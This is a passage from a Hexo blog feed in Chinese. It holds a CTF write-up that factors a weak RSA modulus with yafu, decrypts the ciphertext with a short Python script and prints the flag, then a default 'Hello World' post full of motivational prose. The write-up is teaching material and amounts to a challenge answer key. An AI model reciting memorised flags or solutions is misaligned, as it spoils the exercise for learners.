e, n)**：这使用 RSA 公钥 (n, e) 加密整数消息m。密文计算为 m的 e次幂模 n。</p><h3 id="3-yafu工具的使用•﹏•"><a href="#3-yafu工具的使用•﹏•" class="headerlink" title="3.yafu工具的使用•﹏•"></a>3.yafu工具的使用•﹏•</h3><p>下载网址：<a href="https://sourceforge.net/projects/yafu/">https://sourceforge.net/projects/yafu/</a></p><p>首先我们结合上面的数据知道<strong>n</strong>和<strong>c</strong>的数据，因为<strong>n&#x3D;p*q</strong>，所以我们就可以通过分解质因数求p和q，那么推荐的工具肯定当选yafu.</p><blockquote><p><strong><code>yafu</code> 是一个用于数学计算的开源软件，它是一个快速的因数分解工具，可以用于分解大整数。它使用了多种算法来分解整数，包括 Pollard rho、Quadratic sieve 和 Number field sieve 等算法。<code>yafu</code> 还包含其他一些工具，例如计算最大公因数、计算模逆元、计算离散对数等等。</strong></p></blockquote><p>我们在下载后，解压到一个文件夹里，在文件夹里我们打开PowerShell，首先输入**.\yafu-x64.exe**接着输入factor（要分解的数）等一段时间。。。咦！好了！</p><p><img src="https://img-blog.csdnimg.cn/0222df4e32be4712866af24d914ffa7e.png#pic_center" alt="在这里插入图片描述">得出p和q是分别其中的一个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P39 = 274539690398523616505159415195049044439</span><br><span class="line">P39 = 322368694010594584041053487661458382819</span><br></pre></td></tr></table></figure><h3 id="4-总结数据˃̣̣̥᷄⌓˂̣̣̥᷅"><a href="#4-总结数据˃̣̣̥᷄⌓˂̣̣̥᷅" class="headerlink" title="4.总结数据˃̣̣̥᷄⌓˂̣̣̥᷅"></a>4.总结数据˃̣̣̥᷄⌓˂̣̣̥᷅</h3><p>那么我们进行小总结</p><p>我们可以获得</p><blockquote><p><strong>p&#x3D;274539690398523616505159415195049044439</strong></p><p><strong>q&#x3D;322368694010594584041053487661458382819</strong></p><p><strong>n &#x3D; 88503001447845031603457048661635807319447136634748350130947825183012205093541</strong><br>       <strong>c &#x3D; 40876621398366534035989065383910105526025410999058860023908252093679681817257</strong></p></blockquote><h3 id="5-编写脚本’◡’"><a href="#5-编写脚本’◡’" class="headerlink" title="5.编写脚本’◡’"></a>5.编写脚本’◡’</h3><p>已知p、q、n、c我们编写代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2  <span class="comment"># 导入高精度计算库gmpy2</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes  <span class="comment"># 导入将长整数转换为字节串的工具函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义RSA公钥和密文</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">40876621398366534035989065383910105526025410999058860023908252093679681817257</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义RSA算法中使用的两个大素数p和q，以及模数n和欧拉函数值phi_n</span></span><br><span class="line">p = <span class="number">322368694010594584041053487661458382819</span></span><br><span class="line">q = <span class="number">274539690398523616505159415195049044439</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算RSA私钥中的解密指数</span></span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用RSA算法解密密文c，得到明文m</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将解密后的长整数m转换为字节串，并输出到屏幕上</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/1a26f306b4eb4e569fc14ac9698b2b4f.png#pic_center" alt="在这里插入图片描述"></p><p>运行之后得到flag为HSCTF{@Zh3n_Ba1_G3i!@}</p><h3 id="6-关于RSA小故事"><a href="#6-关于RSA小故事" class="headerlink" title="6.关于RSA小故事"></a>6.关于RSA小故事</h3><blockquote><p><strong>RSA是一种非对称加密算法，由Ron Rivest、Adi Shamir和Leonard Adleman三位密码学家在1977年共同发明。RSA算法的安全性基于大整数分解的困难性，它可以用于实现数字签名、密钥交换、数据加密等安全通信功能。</strong></p><p><strong>RSA算法的原理是基于数论中的欧拉定理和费马小定理。具体来说，RSA算法的公钥和私钥分别由以下参数组成：</strong></p><ol><li><strong>公钥：加密指数（e）和模数（n）；</strong></li><li><strong>私钥：解密指数（d）和模数（n）。</strong></li></ol><p><strong>RSA算法的加密过程如下：</strong></p><ol><li><strong>将明文m转换为一个大整数M；</strong></li><li><strong>使用公钥中的加密指数e和模数n，计算密文C &#x3D; M^e mod n；</strong></li><li><strong>将密文C发送给接收方。</strong></li></ol><p><strong>RSA算法的解密过程如下：</strong></p><ol><li><strong>接收到密文C；</strong></li><li><strong>使用私钥中的解密指数d和模数n，计算明文M &#x3D; C^d modn；</strong></li><li><strong>将明文M转换为原始的明文m。</strong></li></ol><p><strong>需要注意的是，在RSA算法中，加密指数e和解密指数d是一对互为逆元的数，即d * e &#x3D; 1 mod phi(n)，其中phi(n)表示欧拉函数值。因此，只有私钥持有者才能够计算出解密指数d，从而解密密文。同时，RSA算法的安全性基于大整数分解的困难性，即对于一个大的合数n，找到它的质因数p和q是一个非常困难的问题，这保证了RSA算法在当前的计算能力下是安全的。</strong></p><p><strong>除了基本的RSA加密和解密，RSA算法还有许多变种和扩展，比如加密填充方案、签名方案、密钥生成方案等。RSA算法的应用非常广泛，包括SSL&#x2F;TLS协议、数字证书、电子邮件加密、数字签名等领域。</strong></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcom&lt;/p&gt;
&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h1 id=&quot;一、攻防世界Crypto-初识rsa&quot;&gt;&lt;a href=&quot;#一、攻防世界Crypto-初识rsa&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2023/02/25/hello-world/"/>
    <id>http://example.com/2023/02/25/hello-world/</id>
    <published>2023-02-25T02:55:57.729Z</published>
    <updated>2023-03-13T21:55:03.442Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><p><strong>三万六千日，夜夜当秉烛，白日何短短，百年若易海。</strong></p><p><strong>当你两手握着沙子的时候，你也就一定拿不到地上的那颗明珠了。</strong></p><p><strong>为人如立山千仞，为学如海纳百川信心无畏，良心无愧，青春无悔撑开自信的帆，破浪向前，展示搏击风采坚定的信念持久的勤奋科学的方法成功人生能有几回搏，此时不搏待何时细节决定成败，拼搏铸就人生。</strong></p><p><strong>鹰爱高飞，鸦栖一枝。鸟贵有翼，人贵有志。靠山山会倒，靠水水会流，靠自己永远不倒。欲望以提升热忱，毅力以磨平高山。只要路是对的，就不怕路远</strong>。</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><p><strong>社会是大海，人生是小舟，理想和信念就是引航的&#96;灯塔和推进的风帆。咱们在大学期间不仅仅要提高知识水平，更要坚定科学崇高的理想信念。然而理想不等于现实，理想的实现往往要透过1条充满艰难险阻的曲折之路，有赖于脚踏实地，持之以恒的奋斗。只有实践才是通往理想彼岸的桥梁</strong>。</p><p><strong>治学要耐得住寂寞，做人须经得起风雨。贵人之心责已，则宽；利己之心利人，则容。信念是人生之车的轮，理想是人生之舟的帆。成功终究是昨夜星辰，勤奋却是不熄的明灯。有作为，十年胜百年；无目标，百岁犹一岁。骨气、正气、与气，气爽神清；诚心、意心、热心，心宽体健。</strong></p><p><strong>正能量就像给自己插上翅膀，才能飞得更高；炼造一双千里眼，才能望得更远。满载而行，即使困难重重，留下的汗水也终会获得回报；满载而行，即使艰辛与泪水并存，前方的道路也依然光明；满载而行，即使跌倒，也将有勇气迈向成功。</strong></p><p><strong>我们怀揣火种走过黑暗长夜，跨过战友的遗骸，踏过荆棘和深渊，最终在累累尸骨上重新点燃了种族延续的火炬。我们这些活下来的人不需要历史来记载功勋，也无谓那些空虚华美的称颂;只要山川河流、千万英灵，见证过我们前仆后继的跋涉，和永不放弃的努力。</strong></p><blockquote><p>外面下着大雨，潮湿的空气令我难受，不知道过了几刻钟，我也不知道自己在干什么，似乎是在发愣，可是发愣也不是如此——思绪如麻，剪不断，理还乱。脑子里装满了噪音，我不知道自己还有多少天才能熬过头。外面的雨似乎是发现了小草有点讨厌自己了，开始离去。风雨过后，理应是美好的时候，阳光出来了，彩虹也时隐时现。听不见了这烦人的雨声，我开始朝门口走去，当我触碰到第一缕阳光的时候，我感觉到的不是光明的日子，而是一种极端的另一种日子。我似乎忘记了它原本所拥有的温度了，此时的我我只感受到了痛苦，望着不惹人爱的外面，我还是走了出去，阳光刺着我的双眼、空气抓住我的喉咙，似乎一撇一捺组成的不是那个字，而是X，似乎我不该过来。在房子里，找不出一点任何的意义，只有抱膝灯前影伴身。外面天气十分的晴朗，小鸟在欢唱、小花在跳舞。而身处房子里的我，似乎并不是很喜欢这种场景，外面耀眼的阳光却无法除去房子里的阴影。或许这就是人生吧。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a hre</summary>
      
    
    
    
    
  </entry>
  
</feed>
